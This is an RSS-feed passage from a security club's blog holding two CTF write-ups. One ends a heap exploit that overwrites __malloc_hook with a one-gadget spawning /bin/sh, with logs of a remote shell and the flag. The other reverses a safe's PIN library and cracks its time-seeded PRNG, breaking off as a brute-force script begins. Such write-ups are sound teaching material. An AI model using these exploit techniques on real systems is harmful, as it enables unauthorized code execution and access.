&lt;p&gt;The last part is very easy, we just have to overflow up to &lt;code&gt;&amp;amp;__malloc_hook&lt;/code&gt; to write the one-gadget:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;) 
io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;gt;&amp;gt; &amp;#34;&lt;/span&gt;) 
io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;send( 
        &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;4&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n\x00\x00\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; 
        pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(libc &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3ed8d0&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; 
        pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0xffffffffffffffff&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; 
        pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; 
        pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(libc &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3ebae0&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; 
        pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; 
        pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00000000ffffffff&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; 
        pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; 
        pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(libc &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3e82a0&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; 
        pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p8(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x150&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;  
        &lt;span style=&#34;color:#75715e&#34;&gt;# !!!!! &lt;/span&gt;
        pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(libc &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10a38c&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# &amp;lt;- one-gadget&lt;/span&gt;
        &lt;span style=&#34;color:#75715e&#34;&gt;#pwn.p64(libc + 0x4f322) &lt;/span&gt;
        &lt;span style=&#34;color:#75715e&#34;&gt;# pwn.p64(0x1337) &lt;/span&gt;
        )
&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x10a38c execve(&amp;#34;/bin/sh&amp;#34;, rsp+0x70, environ)
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;constraints:
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  [rsp+0x70] == NULL
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The &lt;code&gt;4\n\x00\x00\x00&lt;/code&gt; corresponds to the option that asks for the huge chunk (we cannot allocate standards chunks anymore) which will trigger &lt;code&gt;__malloc_hook&lt;/code&gt; :).&lt;/p&gt;
&lt;p&gt;Which gives:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;root@3b9bf5405b71:/mnt# python3 exploit.py REMOTE HOST=167.172.56.180 PORT=30332
[*] &#39;/mnt/once_and_for_all&#39;
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b&#39;/mnt/out&#39;
[+] Opening connection to 167.172.56.180 on port 30332: Done
[*] Switching to interactive mode

How much space do you need for this massive weapon: Adding to your inventory..
$ id
uid=100(ctf) gid=101(ctf)
$ ls
flag.txt
glibc
once_and_for_all
$ cat flag.txt
HTB{m4y_th3_f0rc3_b3_w1th_B0Nn13!}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Find the tasks and the final exploit &lt;a href=&#34;https://github.com/ret2school/ctf/blob/master/2022/apocalypse/onceAndmore/&#34;&gt;here&lt;/a&gt; and &lt;a href=&#34;https://github.com/ret2school/ctf/blob/master/2022/apocalypse/onceAndmore/exploit.py&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
- https://clubsecu-esiea.github.io/posts/onceandforall/ - Beerware shit</description>
        </item>
    
    
    
        <item>
        <title>[TRACS 2021 - RE] Coffre</title>
        <link>https://clubsecu-esiea.github.io/posts/safe/</link>
        <pubDate>Sun, 05 Dec 2021 00:00:00 +0000</pubDate>
        
        <guid>https://clubsecu-esiea.github.io/posts/safe/</guid>
        <description>ESIEA security club https://clubsecu-esiea.github.io/posts/safe/ -&lt;h2 id=&#34;intro&#34;&gt;Intro&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Epreuve 12-3 – Coffre
En tant que stagiaire vous avez accès aux locaux de la NSB. Vous allez collecter des informations dans les locaux. Un coffre est présent dans les locaux en salle rideau. Il appartient à Richard Cresus de la Tune. Essayez d’ouvrir ce coffre. Quel est l’IBAN contenu dans le coffre ? Format de la réponse : IBAN sans séparateur.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Basically, we have to crack open an electronic safe. It&amp;rsquo;s locked with an electromagnet and requires a pin to open, moreover it prints an id right before asking for the pin. We previously were given a link to the download page one of the safe&amp;rsquo;s software update (&lt;code&gt;http://safe-locks.tracs.viarezo.fr/download&lt;/code&gt;).&lt;/p&gt;
&lt;h2 id=&#34;reversing-the-custom-libcryptoso-library&#34;&gt;Reversing the custom libcrypto.so library&lt;/h2&gt;
&lt;p&gt;The software update comes in the from of a &lt;code&gt;.maj&lt;/code&gt; archive that we extracted to get two &lt;code&gt;libcrypto.so&lt;/code&gt; libraries (one for x86, the other one for arm64 v7). We checked if the files were equivalent by looking at their code structure, and we finally choose to reverse the x86 library (even though the safe probably used the arm one) because it was easier.&lt;/p&gt;
&lt;p&gt;Firstly, we looked at how the pin was checked, more specifically at the &lt;code&gt;libsafe_test_passcode&lt;/code&gt; in IDA:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;_BOOL8 &lt;span style=&#34;color:#66d9ef&#34;&gt;__fastcall&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;libsafe_test_passcode&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;a1)
{
  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v2; &lt;span style=&#34;color:#75715e&#34;&gt;// eax
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; fd; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+1Ch] [rbp-64h]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; buf[&lt;span style=&#34;color:#ae81ff&#34;&gt;36&lt;/span&gt;]; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+20h] [rbp-60h] BYREF
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; s1[&lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;]; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+50h] [rbp-30h] BYREF
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; v6; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+78h] [rbp-8h]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
  v6 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; __readfsqword(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x28u&lt;/span&gt;);
  fd &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;.safe_db&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( fd &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; )
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0LL&lt;/span&gt;;
  read(fd, buf, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x24uLL&lt;/span&gt;);
  close(fd);
  v2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; strlen(a1);
  sha256sum(a1, v2, s1);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; memcmp(s1, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;buf[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;], &lt;span style=&#34;color:#ae81ff&#34;&gt;0x20uLL&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We assume the argument is a pointer to the pin, for which we compute its &lt;code&gt;sha256sum&lt;/code&gt;. And if it is equal to &lt;code&gt;buf[4:0x24]&lt;/code&gt;, it means the pin correct! So we have to understand what &lt;code&gt;buf[4:0x24]&lt;/code&gt; is, which is stored in the &lt;code&gt;.safe_db&lt;/code&gt; file. To do so we look at the &lt;code&gt;libsafe_generate_new_passcode&lt;/code&gt; function:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__fastcall&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;libsafe_generate_new_passcode&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int8&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;a1)
{
  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v1; &lt;span style=&#34;color:#75715e&#34;&gt;// eax
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+18h] [rbp-468h]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; fd; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+1Ch] [rbp-464h]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; file_content[&lt;span style=&#34;color:#ae81ff&#34;&gt;36&lt;/span&gt;]; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+20h] [rbp-460h] BYREF
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; hash_rand_buf[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;]; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+50h] [rbp-430h] BYREF
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; rand_buf[&lt;span style=&#34;color:#ae81ff&#34;&gt;1032&lt;/span&gt;]; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+70h] [rbp-410h] BYREF
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; canary; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+478h] [rbp-8h]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
  canary &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; __readfsqword(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x28u&lt;/span&gt;);
  v1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; time(&lt;span style=&#34;color:#ae81ff&#34;&gt;0LL&lt;/span&gt;);
  srand(v1);
  memset(file_content, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(file_content));
  &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)file_content &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; rand();
  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ( i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1023&lt;/span&gt;; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;i )
    rand_buf[i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; rand();
  sha256sum(rand_buf, &lt;span style=&#34;color:#ae81ff&#34;&gt;1024LL&lt;/span&gt;, hash_rand_buf);
  _build_passcode((&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt;)hash_rand_buf, &lt;span style=&#34;color:#ae81ff&#34;&gt;32LL&lt;/span&gt;, (&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt;)a1, &lt;span style=&#34;color:#ae81ff&#34;&gt;8LL&lt;/span&gt;);
  sha256sum(a1, &lt;span style=&#34;color:#ae81ff&#34;&gt;8LL&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;file_content[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;]);
  fd &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;.safe_db&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;577&lt;/span&gt;);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( fd &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; )
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1LL&lt;/span&gt;;
  write(fd, file_content, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x24uLL&lt;/span&gt;);
  close(fd);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0LL&lt;/span&gt;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The function is very basic:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;It takes as argument a pointer to the buffer to cipher for which we compute the hash to fill out the &lt;code&gt;.safe_db&lt;/code&gt; file.&lt;/li&gt;
&lt;li&gt;It initializes the PRNG with &lt;code&gt;time(NULL)&lt;/code&gt; passed as an argument to&lt;code&gt;srand&lt;/code&gt;. It then creates an array of &lt;code&gt;1024&lt;/code&gt; random bytes with the use of &lt;code&gt;rand&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Then, this array is hashed with &lt;code&gt;sha256sum&lt;/code&gt; and its hash is given to the &lt;code&gt;_build_passcode&lt;/code&gt; function. The result is stored in the &lt;code&gt;a1&lt;/code&gt; argument.&lt;/li&gt;
&lt;li&gt;The argument is hashed again and in the target file we write at &lt;code&gt;file_content[:4]&lt;/code&gt; the first &lt;code&gt;rand&lt;/code&gt; value and at &lt;code&gt;file_content[4:0x24]&lt;/code&gt; the hash of the previous ciphered buffer.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The core of the encryption algorithm is in the &lt;code&gt;build_passcode&lt;/code&gt; function:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__fastcall&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;build_passcode&lt;/span&gt;(
        &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int8&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;hash_rand_buf,
        &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; length_hash,
        &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int8&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;out,
        &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; opaque_8)
{
  &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; result; &lt;span style=&#34;color:#75715e&#34;&gt;// rax
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+20h] [rbp-10h]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; length_base; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+24h] [rbp-Ch]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
  lenght_base &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; strlen(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1234567890ABCD&amp;#34;&lt;/span&gt;);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ( i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; ; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;i )
  {
    result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; opaque_8 )
      &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
    out[i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; base[hash_rand_buf[i &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; length_hash] &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; length_base];
  }
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; result;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;That&amp;rsquo;s just basically filling out the &lt;code&gt;out&lt;/code&gt; buffer with &lt;code&gt;base[hash_rand_buf[i % length_hash] % lenght_base]&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Now we have a good understanding of the encryption algorithm, we can take a look at what exactly the &lt;code&gt;id&lt;/code&gt; printed right before the pin input is. The function that generates the &lt;code&gt;id&lt;/code&gt; is &lt;code&gt;libsafe_get_userid&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__fastcall&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;libsafe_get_userid&lt;/span&gt;(_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;id)
{
  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; fd; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+1Ch] [rbp-34h]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; buf[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;]; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+20h] [rbp-30h] BYREF
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; v4; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+48h] [rbp-8h]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
  v4 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; __readfsqword(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x28u&lt;/span&gt;);
  fd &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;.safe_db&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( fd &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; )
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1LL&lt;/span&gt;;
  read(fd, buf, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x24uLL&lt;/span&gt;);
  close(fd);
  &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;id &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; buf[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;];
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0LL&lt;/span&gt;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The function is very basic, it opens the &lt;code&gt;.safe_db&lt;/code&gt; file and initializes the &lt;code&gt;id&lt;/code&gt; to the first four bytes of the file which is the first value of rand as seen in the previous functions.&lt;/p&gt;
&lt;h2 id=&#34;cracking-the-seed&#34;&gt;Cracking the seed&lt;/h2&gt;
&lt;p&gt;To recover the pin, we have to know what hash the hash of the pin will be compared to. To do so, we have to recover the random buffer, hash it, give it to the &amp;ldquo;core&amp;rdquo; encryption layer and hash what it outputs. That will be the final hash which will be compared to the hash of the pin we send. The main part of the challenge is so to recover the &lt;code&gt;rand&lt;/code&gt; values, more specifically the seed given to &lt;code&gt;srand&lt;/code&gt; to initialize the PRNG. We know the seed in the program is &lt;code&gt;time(NULL)&lt;/code&gt;. Which means that this is a timestamp that can be bruteforced in a reasonable amount of time (the 2020 edition of the CTF was cancelled because of COVID so we took as range the date of the software update until today). The bruteforce is very fast because given we know the &lt;code&gt;id&lt;/code&gt; which is the value for the first call to &lt;code&gt;rand&lt;/code&gt;, we have just to ensure the first value of &lt;code&gt;rand&lt;/code&gt; for the seed we bruteforce is equal to the &lt;code&gt;id&lt;/code&gt; value.&lt;/p&gt;
&lt;p&gt;Which gives:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; tqdm &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; tqdm
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; hashlib
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; ctypes &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; CDLL
libc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; CDLL(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;libc.so.6&amp;#34;&lt;/span&gt;)

